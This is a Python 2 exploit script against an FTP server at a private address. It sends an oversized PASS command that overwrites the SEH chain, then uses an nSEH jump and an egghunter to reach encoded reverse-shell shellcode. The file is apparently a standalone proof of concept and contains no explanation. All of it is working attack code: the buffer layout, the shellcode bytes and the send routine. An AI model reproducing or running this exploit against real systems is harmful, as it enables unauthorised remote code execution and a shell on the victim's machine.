#!/usr/bin/env python

import sys
import socket
import time

host = '192.168.1.119'
port = 21

try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except:

	print 'Socket() failed'
	sys.exit(1)

#restricted characters = '\x0a'

Seh = '\x65\xb8\x41\x00'
nSeh = '\x90\x90\xeb\x80'		#first jump, reverse short jmp 128 bytes
egghunter =  (
'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
'\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
)
egg = 'T00WT00W'

reverse_shell = (
"\xbf\xa1\xd5\xfc\x88\xda\xd1\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x78\x12\x83\xe8\xfc\x03\xd9\xdb\x1e\x7d\xe5\x0c\x5c"
"\x7e\x15\xcd\x01\xf6\xf0\xfc\x01\x6c\x71\xae\xb1\xe6\xd7\x43"
"\x39\xaa\xc3\xd0\x4f\x63\xe4\x51\xe5\x55\xcb\x62\x56\xa5\x4a"
"\xe1\xa5\xfa\xac\xd8\x65\x0f\xad\x1d\x9b\xe2\xff\xf6\xd7\x51"
"\xef\x73\xad\x69\x84\xc8\x23\xea\x79\x98\x42\xdb\x2c\x92\x1c"
"\xfb\xcf\x77\x15\xb2\xd7\x94\x10\x0c\x6c\x6e\xee\x8f\xa4\xbe"
"\x0f\x23\x89\x0e\xe2\x3d\xce\xa9\x1d\x48\x26\xca\xa0\x4b\xfd"
"\xb0\x7e\xd9\xe5\x13\xf4\x79\xc1\xa2\xd9\x1c\x82\xa9\x96\x6b"
"\xcc\xad\x29\xbf\x67\xc9\xa2\x3e\xa7\x5b\xf0\x64\x63\x07\xa2"
"\x05\x32\xed\x05\x39\x24\x4e\xf9\x9f\x2f\x63\xee\xad\x72\xec"
"\xc3\x9f\x8c\xec\x4b\x97\xff\xde\xd4\x03\x97\x52\x9c\x8d\x60"
"\x94\xb7\x6a\xfe\x6b\x38\x8b\xd7\xaf\x6c\xdb\x4f\x19\x0d\xb0"
"\x8f\xa6\xd8\x17\xdf\x08\xb3\xd7\x8f\xe8\x63\xb0\xc5\xe6\x5c"
"\xa0\xe6\x2c\xf5\x4b\x1d\xa7\x3a\x23\x1c\x91\xd3\x36\x1e\xd9"
"\xf1\xbe\xf8\x8b\xe5\x96\x53\x24\x9f\xb2\x2f\xd5\x60\x69\x4a"
"\xd5\xeb\x9e\xab\x98\x1b\xea\xbf\x4d\xec\xa1\x9d\xd8\xf3\x1f"
"\x89\x87\x66\xc4\x49\xc1\x9a\x53\x1e\x86\x6d\xaa\xca\x3a\xd7"
"\x04\xe8\xc6\x81\x6f\xa8\x1c\x72\x71\x31\xd0\xce\x55\x21\x2c"
"\xce\xd1\x15\xe0\x99\x8f\xc3\x46\x70\x7e\xbd\x10\x2f\x28\x29"
"\xe4\x03\xeb\x2f\xe9\x49\x9d\xcf\x58\x24\xd8\xf0\x55\xa0\xec"
"\x89\x8b\x50\x12\x40\x08\x60\x59\xc8\x39\xe9\x04\x99\x7b\x74"
"\xb7\x74\xbf\x81\x34\x7c\x40\x76\x24\xf5\x45\x32\xe2\xe6\x37"
"\x2b\x87\x08\xeb\x4c\x82")

crash =  "A" * 597 + '\x90' * (200-len(egghunter)) + egghunter
crash += nSeh
crash += Seh
crash += egg + '\x90' * 100 + reverse_shell + "D" * (2000-797-4-4-4-100-len(reverse_shell))

s.connect((host, port))
print s.recv(1024)
s.send("USER anonymous\r\n")
print s.recv(1024)
time.sleep(1)

print ("[+] Sending " + str(len(crash)) + " bytes PASS crash...")

s.send("PASS " + crash + "\r\n")
print s.recv(1024)
